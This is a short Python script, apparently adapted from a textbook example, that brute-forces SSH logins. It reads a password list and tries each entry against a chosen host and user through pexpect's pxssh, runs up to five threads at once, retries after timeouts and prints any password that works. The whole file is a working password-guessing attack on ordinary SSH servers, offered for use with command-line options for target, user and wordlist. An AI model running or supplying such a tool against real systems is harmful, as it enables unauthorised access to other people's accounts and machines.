# coding=UTF-8
from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found, Fails, PASSWORD
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
        PASSWORD = password
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prog ' + \
        '-H <target host> -u <user> -f <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', \
        help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string', \
        help='specify password file')
    parser.add_option('-u', dest='user', type='string', \
        help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: The password is 'PASSWORD'")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        t.start()

if __name__ == '__main__':
    main()